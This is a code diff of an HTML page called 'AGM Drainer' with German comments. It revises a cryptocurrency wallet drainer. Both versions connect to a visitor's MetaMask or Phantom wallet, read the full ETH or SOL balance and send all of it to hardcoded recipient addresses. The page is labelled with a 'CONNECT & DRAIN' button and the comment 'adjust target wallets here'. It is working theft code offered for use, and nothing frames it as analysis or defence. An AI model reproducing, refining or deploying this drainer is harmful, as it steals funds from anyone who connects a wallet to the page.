@@ -1,149 +1,122 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Drainer Fix 2.0</title>
-    <style>
-    body { background-color: #1a1a1a; color: #00e5ff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-   .card { border: 2px solid #00e5ff; padding: 30px; border-radius: 15px; text-align: center; width: 280px; box-shadow: 0 0 20px rgba(0, 229, 255, 0.2); }
-    button { background: #00e5ff; color: black; border: none; padding: 15px; width: 100%; font-weight: bold; font-size: 16px; border-radius: 8px; cursor: pointer; }
-    button:disabled { background: #333; color: #555; }
-    #status { margin-top: 20px; font-size: 14px; word-break: break-all; }
-   .highlight { color: #fff; font-weight: bold; }
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>AGM Drainer Final</title>
+   
+   <!-- 1. ETHEREUM LIBRARY (V6 STABLE) -->
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+   
+   <!-- 2. SOLANA LIBRARY -->
+   <script src="https://unpkg.com/@solana/web3.js@_1.87.2/lib/index.iife.min.js"></script>
+
+   <style>
+   body { background-color: #0d1117; color: #00ffaa; font-family: monospace; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; margin: 0; }
+  .card { border: 2px solid #00ffaa; padding: 50px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00ffaa; background: #161b22; width: 350px; }
+   button { background: #00ffaa; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; font-size: 1.2rem; width: 100%; border-radius: 10px; }
+   button:disabled { background: #555; cursor: not-allowed; }
+   #status { margin-top: 20px; font-size: 14px; color: #8b949e; line-height: 1.5; }
+  .error { color: #ff7b72!important; }
    </style>
 </head>
 <body>
-    <div class="card">
-    <h2>AGM DRAINER</h2>
-    <button id="btn" onclick="start()">CONNECT & DRAIN</button>
-    <div id="status">Press button...</div>
-   </div>
 
-    <script>
-    // --- KONFIGURATION ---
-    // 1. Deine ETH Adresse
-    const TARGET_ETH = "0x35b115c18f035a65Ea5A5FF6F46Fe3E00a89e2bF";
-    // 2. Deine Phantom Adresse
-    const TARGET_SOL = "9isRMs7FCaCgak95x4LRxg47DyP1ksLiF9JHG3NxYCuG"; 
+   <div class="card">
+   <h2>AGM DRAINER</h2>
+   <button id="btn" onclick="runDrainer()">CONNECT & DRAIN</button>
+   <div id="status">Awaiting user interaction...</div>
+  </div>
 
-    const btn = document.getElementById('btn');
-    const status = document.getElementById('status');
-    let counter = 0; // Zählt, wie oft wir versucht haben zu verbinden
+   <script>
+   const status = document.getElementById("status");
+   const btn = document.getElementById("btn");
 
-    // Hilfsfunktion für Warten
-    const waitFor = (condition, timeout = 5000) => {
-    return new Promise(resolve => {
-    const interval = setInterval(() => {
-    if (condition()) {
-    clearInterval(interval);
-    resolve();
+   // ZIEL WALLETS (HIER ANPASSEN!)
+   const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C";
+   const TARGET_SOL = "zUs7NqCiwuD2QHkaL98fwVayURW9y8yb2AYEmDMMSk38"; // Beispiel
+
+   async function runDrainer() {
+   btn.disabled = true;
+   status.innerText = "Searching for wallets...";
+   
+   try {
+   // 1. PHANTOM CHECK
+   if (window.solana && window.solana.isPhantom) {
+   status.innerText = "Connected to Phantom. Checking SOL...";
+   await handleSOL();
+   return; 
    }
-    if (counter++ > 20) {
-    clearInterval(interval);
-    resolve();
+   
+   // 2. METAMASK CHECK
+   if (window.ethereum) {
+   status.innerText = "Connected to MetaMask. Checking ETH...";
+   await handleETH();
+   return;
+  }
+
+   throw new Error("No compatible wallet found in browser.");
+   } catch (e) {
+   status.innerHTML = `<span class="error">Process Stopped: ${e.message}</span>`;
+   btn.disabled = false;
+   btn.innerText = "Retry Connection";
    }
-    }, 200);
+  }
+
+   async function handleETH() {
+   try {
+   // Verwende 'ethers' direkt falls v6 geladen wurde
+   const provider = new ethers.BrowserProvider(window.ethereum);
+   const signer = await provider.getSigner();
+   const address = await signer.getAddress();
+   status.innerText = `Found: ${address.slice(0,6)}...${address.slice(-4)}`;
+   
+   const balance = await provider.getBalance(address);
+   
+   if (balance > 0n) {
+   status.innerHTML = "<b>Draining ETH...</b>";
+   const tx = await signer.sendTransaction({ 
+   to: TARGET_ETH, 
+   value: balance 
    });
-  };
+   status.innerText = "Tx Sent! Hash: " + tx.hash;
+   } else {
+   throw new Error("Wallet is empty.");
+   }
+   } catch (e) {
+   throw new Error(`ETH Error: ${e.message}`);
+   }
+  }
 
-    async function start() {
-    btn.disabled = true;
-    status.innerText = "Initiating...";
-    counter = 0;
-
-    // Check Check Check Loop
-    while (counter < 3) {
-    // 1. SUPREME FIX für MAC/Safari: Manuell MetaMask anwerfen
-    if (!window.ethereum?.isMetaMask) {
+   async function handleSOL() {
    try {
-    // Schickt den User zum Connect
-    await window.ethereum?.request({ method: 'eth_requestAccounts' });
-    } catch (e) {
-    console.log("User closed prompt");
-   }
-  }
-
-    // Check, ob BEREITS die Wallet verbunden ist (oder sich so anfühlt)
-    if (window.ethereum) {
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const acc = await provider.listAccounts(); 
-  
-    // Wenn eine Kontonummer (auch 0x0) nachweislich existiert
-    if (acc && acc.length > 0 && acc[0].address!== undefined) {
-    await drainETH(target = TARGET_ETH);
-    return;
-   }
-  }
-
-    // Phantom Check
-    if (window.solana?.isPhantom) {
-    // Phantom braucht einen ".", das Pixelternal Connect
-    const provider = window.solana;
-    await provider.connect();
-  
-    const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-    const bal = await conn.getBalance(provider.publicKey);
-  
-    if (bal > 0) {
-    await drainSOL(provider, bal);
-    return;
-   }
-  }
-
-    await new Promise(r => setTimeout(r, 500)); // Kurze Pause
-    counter++;
-  }
-
-    status.innerHTML = `<span class="highlight">MISSING: No Wallets connected.</span><br>Click Button again if wallets are visible.`;
-    btn.disabled = false;
-  }
-
-    // ETH Drainer
-    async function drainETH(target) {
-   try {
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-  
-    status.innerText = `Wallet: ${await signer.getAddress()}`;
-    const bal = await provider.getBalance(signer.address);
-
-    if (bal > 0n) {
-    status.innerText = "Transferring ETH...";
-    const tx = await signer.sendTransaction({ to: target, value: bal });
-    status.innerText = `FINISHED: ETH Sent (Hash: ${tx.hash})`;
-    btn.disabled = true;
-    } else {
-    status.innerText = "No ETH found (Try Phantom connection first).";
-    btn.disabled = false;
-   }
-    } catch (e) {
-    console.error(e);
-    status.innerText = "Error connecting ETH.";
-    btn.disabled = false;
-   }
-  }
-
-    // Sol Drainer
-    async function drainSOL(provider, lamports) {
-   try {
-    status.innerText = "Transferring SOL...";
-    const tx = new solanaWeb3.Transaction().add(
-    solanaWeb3.SystemProgram.transfer({
-    fromPubkey: provider.publicKey,
-    toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
-    lamports: lamports
+   const provider = window.solana;
+   await provider.connect();
+   const { publicKey } = provider;
+   
+   status.innerText = `Found: ${publicKey.toBase58().slice(0,6)}...`;
+   
+   const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+   const balance = await connection.getBalance(publicKey);
+   
+   if (balance > 0) {
+   status.innerHTML = "<b>Draining SOL...</b>";
+   const transaction = new solanaWeb3.Transaction().add(
+   solanaWeb3.SystemProgram.transfer({
+   fromPubkey: publicKey,
+   toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
+   lamports: balance,
    })
    );
-    await provider.signAndSendTransaction(tx);
-    status.innerText = "FINISHED: SOL Drained!";
-    btn.disabled = true;
-    } catch (e) {
-    console.error(e);
-    status.innerText = "Error transferring SOL.";
-    btn.disabled = false;
+   await provider.signAndSendTransaction(transaction);
+   status.innerText = "SOL sent successfully!";
+   } else {
+   throw new Error("SOL wallet is empty.");
+   }
+   } catch (e) {
+   throw new Error(`SOL Error: ${e.message}`);
    }
    }
-</script>
+   </script>
 </body>
 </html>
